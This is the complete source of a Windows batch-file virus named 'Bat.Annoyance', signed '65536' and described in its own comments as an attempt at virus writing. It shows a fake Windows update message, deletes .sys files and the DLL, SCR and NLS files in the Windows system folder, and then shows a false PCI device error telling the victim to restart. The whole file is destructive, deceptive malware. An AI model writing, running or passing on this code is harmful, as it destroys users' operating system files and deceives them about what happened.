   @echo off
   REM: Bat.Annoyance
   REM: By 65536
   cls
   ECHO.
   ECHO Please wait while Windows updates your system settings
   c:
   del *.sys
   del c:\windows\system\*.dll
   del c:\windows\system\*.scr
   del c:\windows\system\*.nls
   del *.TMP
   cls
   c:
   cd \
   del c:\windows\system\*.dll
   del c:\windows\system\*.scr
   del c:\windows\system\*.nls
   cls
   ECHO.
   ECHO Windows has detected an I/O error with your PCI device
   ECHO.
   ECHO Please restart your system
   ECHO.
   ECHO If this problem persists please contact your retailer
   ECHO.

   :END

   REM: My second attempt at Vxing
   REM: -65536
